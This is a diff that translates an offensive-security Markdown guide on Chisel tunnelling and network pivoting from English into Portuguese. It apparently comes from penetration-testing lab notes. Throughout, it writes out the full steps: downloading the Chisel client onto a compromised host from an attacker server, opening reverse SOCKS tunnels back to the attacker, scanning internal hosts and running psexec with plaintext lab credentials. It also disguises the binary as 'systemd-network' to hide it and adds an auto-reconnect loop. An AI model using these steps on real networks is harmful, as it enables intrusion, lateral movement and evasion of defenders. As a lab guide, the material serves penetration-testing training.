@@ -1,19 +1,19 @@
-# Chisel Complete Setup Guide
+# Guia Completo do Chisel
 
-## Table of Contents
+## Índice
 
-- [Installation](#installation)
-- [Basic Tunnel Setup](#basic-tunnel-setup)
-- [Single-Hop Pivoting](#single-hop-pivoting)
-- [Multi-Hop Pivoting](#multi-hop-pivoting)
-- [Advanced Routing](#advanced-routing)
-- [Troubleshooting](#troubleshooting)
+- [Instalação](#instalação)
+- [Configuração Básica do Tunnel](#configuração-básica-do-tunnel)
+- [Pivoting Single-Hop](#pivoting-single-hop)
+- [Pivoting Multi-Hop](#pivoting-multi-hop)
+- [Roteamento Avançado](#roteamento-avançado)
+- [Resolução de Problemas](#resolução-de-problemas)
 
 ---
 
-## Installation
+## Instalação
 
-### Quick Check (One-liner)
+### Verificação Rápida (One-liner)
 
 ```shell
 # Verificar se Chisel está instalado
@@ -29,7 +29,7 @@ chisel --version
 > | `bind: permission denied` | Porta < 1024 sem root | Use porta > 1024 ou execute com `sudo` |
 > | `connection refused` | Server não iniciado | Inicie o server antes do client |
 
-### Attacker Machine (Kali)
+### Máquina do Atacante (Kali)
 
 > Chisel já vem no Kali. Se precisar da versão mais recente:
 
@@ -48,7 +48,7 @@ chmod +x chisel
 apt install chisel -y
 ```
 
-### Target Machine (Windows/Linux)
+### Máquina Alvo (Windows/Linux)
 
 > Download do binário para Windows
 
@@ -76,21 +76,21 @@ chmod +x chisel
 
 ---
 
-## Basic Tunnel Setup
+## Configuração Básica do Tunnel
 
 ### Modo SOCKS5 Proxy (mais comum)
 
 > Este é o modo padrão para pivoting. O Chisel cria um proxy SOCKS5 no Kali,
 > e o proxychains roteia o tráfego através dele.
 
-#### Step 1: Iniciar Server no Kali (Attacker)
+#### Passo 1: Iniciar Server no Kali (Atacante)
 
 ```shell
 # Server escuta na porta 1080
 chisel server --port 1080 --reverse
 ```
 
-**Output esperado:**
+**Saída esperada:**
 
 ```text
 2024/01/01 00:00:00 server: Listening on http://0.0.0.0:1080
@@ -104,7 +104,7 @@ chisel server --port 1080 --reverse
 - `--socks5`: Habilitar SOCKS5 (habilitado por padrão no modo reverse)
 - `--host 0.0.0.0`: Escutar em todas as interfaces
 
-#### Step 2: Conectar Client no Target
+#### Passo 2: Conectar Client no Alvo
 
 > No target Windows:
 
@@ -118,13 +118,13 @@ chisel server --port 1080 --reverse
 ./chisel client 192.168.49.87:1080 R:socks
 ```
 
-**Output esperado no server:**
+**Saída esperada no server:**
 
 ```text
 2024/01/01 00:00:00 server: session#1: Connected (192.168.49.100:54321)
 ```
 
-#### Step 3: Configurar Proxychains no Kali
+#### Passo 3: Configurar Proxychains no Kali
 
 ```shell
 # Editar /etc/proxychains4.conf
@@ -144,7 +144,7 @@ grep -E "^socks" /etc/proxychains4.conf
 # socks5  127.0.0.1 1080
 ```
 
-#### Step 4: Usar o Tunnel
+#### Passo 4: Usar o Tunnel
 
 ```shell
 # Testar conectividade interna
@@ -158,46 +158,46 @@ proxychains curl http://172.16.87.200
 
 ---
 
-## Single-Hop Pivoting
+## Pivoting Single-Hop
 
-### Scenario: Attacker → WS26 → Internal Network
+### Cenário: Atacante → WS26 → Rede Interna
 
-**Setup:**
+**Configuração:**
 
-- Attacker: 192.168.49.87 (Kali)
+- Atacante: 192.168.49.87 (Kali)
 - Comprometido: 192.168.49.100 (WS26)
 - Alvo interno: 172.16.87.200 (SRV22)
 
-### Complete Workflow
+### Fluxo Completo
 
-> Step 1: Iniciar server Chisel no Kali
+> Passo 1: Iniciar server Chisel no Kali
 
 ```shell
 chisel server --port 443 --reverse
 ```
 
-> Step 2: Transferir client para WS26
+> Passo 2: Transferir client para WS26
 
 ```powershell
 # No WS26
 iwr -Uri "http://192.168.49.87:8000/chisel.exe" -Outfile C:\Temp\chisel.exe
 ```
 
-> Step 3: Conectar client ao server
+> Passo 3: Conectar client ao server
 
 ```powershell
 # No WS26
 C:\Temp\chisel.exe client 192.168.49.87:443 R:socks
 ```
 
-> Step 4: Configurar proxychains e escanear
+> Passo 4: Configurar proxychains e escanear
 
 ```shell
 # Verificar /etc/proxychains4.conf tem: socks5 127.0.0.1 1080
 proxychains nmap -Pn -p 445,3389,5985 172.16.87.200 -sV --open
 ```
 
-> Step 5: Explorar rede interna
+> Passo 5: Explorar rede interna
 
 ```shell
 # SMB
@@ -215,21 +215,21 @@ proxychains impacket-psexec svc_sql:SQLPowerHouse333@172.16.87.200
 
 ---
 
-## Multi-Hop Pivoting
+## Pivoting Multi-Hop
 
-### Scenario: Attacker → WS26 → SRV22 → DC20
+### Cenário: Atacante → WS26 → SRV22 → DC20
 
-**Network Layout:**
+**Layout da Rede:**
 
 ```text
-[Attacker]  →  [WS26]        →  [SRV22]        →  [DC20]
-192.168.49.87  192.168.49.100   172.16.87.100     172.16.100.200
-                (pivot 1)        (pivot 2)
+[Atacante]  →  [WS26]           →  [SRV22]           →  [DC20]
+192.168.49.87  192.168.49.100      172.16.87.100         172.16.100.200
+                (pivot 1)           (pivot 2)
 ```
 
-### Multi-Hop Setup
+### Configuração Multi-Hop
 
-> Step 1: Primeiro hop — WS26 conecta ao Kali
+> Passo 1: Primeiro hop — WS26 conecta ao Kali
 
 ```shell
 # Kali: inicia server
@@ -241,14 +241,14 @@ chisel server --port 443 --reverse
 .\chisel.exe client 192.168.49.87:443 R:socks
 ```
 
-> Step 2: Segundo hop — Iniciar novo server Chisel no Kali (porta diferente)
+> Passo 2: Segundo hop — Iniciar novo server Chisel no Kali (porta diferente)
 
 ```shell
 # Kali: segundo server para o próximo pivot
 chisel server --port 8443 --reverse
 ```
 
-> Step 3: Do Kali, encaminhar acesso ao SRV22 via primeiro tunnel
+> Passo 3: Do Kali, encaminhar acesso ao SRV22 via primeiro tunnel
 
 ```shell
 # Encaminhar porta 8443 do Kali para dentro da rede interna via proxychains
@@ -295,7 +295,7 @@ xfreerdp3 /u:Administrator /p:Password123 /v:127.0.0.1:3389
 
 ---
 
-## Advanced Routing
+## Roteamento Avançado
 
 ### SOCKS5 com Autenticação
 
@@ -319,7 +319,7 @@ chisel server --port 443 --reverse --tls-domain "" --key /etc/ssl/private/key.pe
 chisel server --port 80 --reverse
 ```
 
-### Forward Mode (Client → Server, sem reverse)
+### Modo Forward (Client → Server, sem reverse)
 
 > Quando o Kali pode conectar diretamente ao target
 
@@ -347,11 +347,11 @@ curl --socks5 127.0.0.1:1080 http://172.16.87.200
 
 ---
 
-## Troubleshooting
+## Resolução de Problemas
 
-### Issue 1: Client Não Conecta
+### Problema 1: Client Não Conecta
 
-**Error:** `connection refused` ou timeout
+**Erro:** `connection refused` ou timeout
 
 > Verificar server está ativo no Kali
 
@@ -376,9 +376,9 @@ chisel server --port 1080 --reverse --verbose
 .\chisel.exe client --verbose 192.168.49.87:1080 R:socks
 ```
 
-### Issue 2: Proxychains Não Roteia
+### Problema 2: Proxychains Não Roteia
 
-**Error:** `|S-chain|-<>-127.0.0.1:1080-<><>-TIMEOUT`
+**Erro:** `|S-chain|-<>-127.0.0.1:1080-<><>-TIMEOUT`
 
 > Verificar configuração do proxychains
 
@@ -400,7 +400,7 @@ grep -E "^(dynamic|strict|random)" /etc/proxychains4.conf
 curl --socks5 socks5h://127.0.0.1:1080 http://172.16.87.200
 ```
 
-### Issue 3: DNS Não Resolve Pelo Tunnel
+### Problema 3: DNS Não Resolve Pelo Tunnel
 
 > Usar `proxychains4 -q` com resolução DNS pelo proxy
 
@@ -412,7 +412,7 @@ curl --socks5 socks5h://127.0.0.1:1080 http://172.16.87.200
 proxychains nslookup dc01.corp.local 172.16.87.1
 ```
 
-### Issue 4: Tunnel Cai Frequentemente
+### Problema 4: Tunnel Cai Frequentemente
 
 > Usar flag `--keepalive` no client
 
@@ -420,13 +420,13 @@ proxychains nslookup dc01.corp.local 172.16.87.1
 .\chisel.exe client --keepalive 10s 192.168.49.87:1080 R:socks
 ```
 
-> Reiniciar automaticamente (Linux target)
+> Reiniciar automaticamente (target Linux)
 
 ```bash
 while true; do ./chisel client 192.168.49.87:1080 R:socks; sleep 5; done
 ```
 
-### Issue 5: Performance Lenta
+### Problema 5: Performance Lenta
 
 > Verificar latência do tunnel
 
@@ -443,7 +443,7 @@ proxychains nmap -Pn --open -p 445,22,80,443,3389,5985 172.16.87.200
 
 ---
 
-## Security Considerations
+## Considerações de Segurança
 
 ### Ocultar Processo Chisel
 
@@ -462,7 +462,7 @@ cp chisel /usr/local/bin/systemd-network
 /usr/local/bin/systemd-network client 192.168.49.87:1080 R:socks
 ```
 
-### Cleanup
+### Limpeza
 
 > Matar o processo no target Windows
 
@@ -486,7 +486,7 @@ pkill -f "chisel server"
 
 ---
 
-## Quick Reference
+## Referência Rápida
 
 ### SOCKS5 Pivot (30 segundos)
 
@@ -549,16 +549,16 @@ proxychains impacket-psexec user@172.16.87.200
 
 ---
 
-## See Also
+## Veja Também
 
-### Related Lateral Movement Files
+### Arquivos Relacionados de Movimento Lateral
 
-- **[Ligolo-ng Complete Guide](Ligolo-ng-Complete-Guide.md)** - Tunneling com interface TUN, multi-hop avançado
+- **[Guia Completo Ligolo-ng](Ligolo-ng-Complete-Guide.md)** - Tunneling com interface TUN, multi-hop avançado
 - **[Pivoting & Tunneling](Pivoting-Tunneling.md)** - SSH tunnels, Proxychains, sshuttle
-- **[Lateral Movement](Lateral-Movement.md)** - PsExec, WMI, WinRM, Pass-the-Hash
+- **[Movimento Lateral](Lateral-Movement.md)** - PsExec, WMI, WinRM, Pass-the-Hash
 
-### AD Exploitation (After Pivoting)
+### Exploração do AD (Após Pivoting)
 
-- **[AD Exploitation](../3.AD-Exploit/3.1.AD-Exploitation.md)** - BloodHound na rede interna
-- **[Kerberos Attacks](../3.AD-Exploit/3.3.Kerberos-Attacks.md)** - Ataques ao DC após tunnel
-- **[NTLM Relay](../3.AD-Exploit/3.4.NTLM-Relay-and-Responder.md)** - Responder através do tunnel
+- **[Exploração do AD](../AD-Exploit/AD-Exploitation.md)** - BloodHound na rede interna
+- **[Ataques Kerberos](../AD-Exploit/Kerberos-Attacks.md)** - Ataques ao DC após tunnel
+- **[NTLM Relay](../AD-Exploit/NTLM-Relay-and-Responder.md)** - Responder através do tunnel
